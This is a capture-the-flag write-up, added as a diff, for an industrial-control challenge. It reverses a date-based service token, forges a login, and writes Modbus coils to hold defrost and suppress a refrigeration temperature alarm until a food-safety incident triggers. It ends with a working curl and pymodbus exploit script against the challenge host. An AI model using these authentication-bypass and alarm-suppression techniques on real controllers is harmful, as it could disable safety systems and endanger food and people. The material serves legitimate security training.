@@ -1,0 +1,130 @@
+1. Recovering the token algorithm
+From dis output, three functions:
+ def service_token_for_date(d):
+     seed = d.year*10000 + d.month*100 + d.day
+     x = (seed ^ 1515018829) & 0xFFFFFFFF
+     x = (x * 523181871) & 0xFFFFFFFF
+     x = ((x >> 13) | (x << 19)) & 0xFFFFFFFF                   # 32-bit right-rotate by
+ 13
+     return x
+
+ def service_code_for_date(d):
+     return '%08x' % service_token_for_date(d)
+
+ def fieldbus_write_enabled(regs, d):
+     return ((regs[0] << 16) | regs[1]) == service_token_for_date(d)
+Verified exact against the real compiled module over 2000 random dates (token reconstruction
+match: True). So the service code is the 8-hex-digit token, and the Modbus unlock is that token
+split into two 16-bit holding registers: HR0 = hi, HR1 = lo.
+
+2. Authenticating
+/api/login accepts {"mode":"service","code":"<8hex>"}. The server clock was 2026-10-17, so the
+token was 07610f86 (hi=0761 lo=0f86). A ±40-day brute over dates confirmed the hit and
+returned the session cookie (payload decodes to {"svc":true}). Logging in yielded the real /panel
+monitor page.
+
+
+
+
+                                                                                             102
+* Coil writes require HR0/HR1 to hold the current token, else exception 0x04.
+
+/api/cases exposed per-case temp, setpoint, alarm_threshold, incident_threshold, alarm_active,
+alarm_suppressed, defrost_hold, and a global incident. /api/incident returns {message, flag}
+once incident is true.
+
+
+3. Wrong turns worth recording
+    A.​ Defrost-hold-only warming. Temps oscillated (MT1 7–19 °C, LT1 −10 to −16 °C) but
+        every peak landed exactly on incident_threshold (12.0 / 11.0 / −10.0), never above. That
+        clamp is the tell: the incident is not temp > incident_threshold. Fighting the sim by
+        rewriting coils every tick also reset the state machine and kept the sim from latching.
+    B.​ Suppress-the-alarm-only. Setting coil 8 = 0 without an active alarm just yields
+        alarm_suppressed:true — not an incident.
+    C.​ Hunting for hidden endpoints. All /api/* besides /api/cases and /api/incident returned 404
+        — no admin/ack/simulate path.
+
+​
+
+
+
+
+                                                                                              103
+4.The actual trigger
+The real-world critical food-safety event is: an active high-temperature alarm gets suppressed
+while the case is still over its safe limit. That's exactly what the incident message says. The
+sequence, in one tight loop:
+    1.​ Unlock: HR0=0x0761, HR1=0x0f86 (token for 2026-10-17).
+    2.​ coil0 = True (defrost hold MT1) and coil8 = True (alarm enabled) → temp climbs past the
+        8.0 °C alarm threshold, alarm_active becomes true.
+    3.​ The instant alarm_active is true, write coil8 = False (suppress) while hot.
+    4.​ Keep holding defrost until the case exceeds its incident_threshold (12.0 °C) with the
+        alarm suppressed.
+
+The successful run:
+ 5 MT1 10.6 alarm_active True suppr False inc False
+ after suppress: ... alarm_suppressed: True ... temp 10.6
+ 6 MT1 12.6 alarm_active False suppr False inc True
+ === RECORD ===
+ {'case': 'MT1', 'flag':
+ "nexsec26{dont-be-so-cold-to-me,-i'll-get-flu_1601c791820a653d6f53cb8fe
+ f09d7d1b40fad91e63688a0df7f4d15692e6827}",
+  'incident': True,
+  'message': 'CRITICAL food-safety incident: case MT1 exceeded the safe
+ limit with high-temperature alarm suppressed.'}
+
+
+5.Final working exploit
+
+
+ # session
+ curl -s -c cookies.txt -X POST http://koala.nexsec.my:37398/api/login \
+   -H 'Content-Type: application/json' -d
+ '{"mode":"service","code":"07610f86"}'
+
+
+ from pymodbus.client import ModbusTcpClient
+ import requests, http.cookiejar, time
+
+ s = requests.Session()
+ cj = http.cookiejar.MozillaCookieJar("cookies.txt");
+ cj.load(ignore_discard=True)
+ s.cookies.update(cj)
+
+ c = ModbusTcpClient('koala.nexsec.my', port=39471, timeout=5);
+ c.connect()
+ def unlock(): c.write_registers(0, [0x0761, 0x0f86], device_id=1)                       #
+ token hi/lo for 2026-10-17
+
+ for i in range(400):
+     unlock()
+
+
+
+                                                                                             104
+    c.write_coil(0, True, device_id=1)    # defrost hold MT1
+    c.write_coil(8, True, device_id=1)    # alarm enabled MT1
+    st = s.get("http://koala.nexsec.my:37398/api/cases").json()
+    mt1 = next(k for k in st["cases"] if k["id"] == "MT1")
+    if mt1["alarm_active"]:
+        unlock(); c.write_coil(8, False, device_id=1)   # suppress
+ACTIVE alarm while hot
+    st = s.get("http://koala.nexsec.my:37398/api/cases").json()
+    if st["incident"]:
+
+print(s.get("http://koala.nexsec.my:37398/api/incident").json()); break
+    time.sleep(0.3)
+c.close()
+
+
+
+
+flag:nexsec26{dont-be-so-cold-to-me,-i'll-get-flu_1601c791820a653d6f53cb8fef09d7d1b40f
+ad91e63688a0df7f4d15692e6827}
+https://chat.deepseek.com/share/yaigj9syukr9e88jj0
+
+
+
+
+                                                                                  105
+
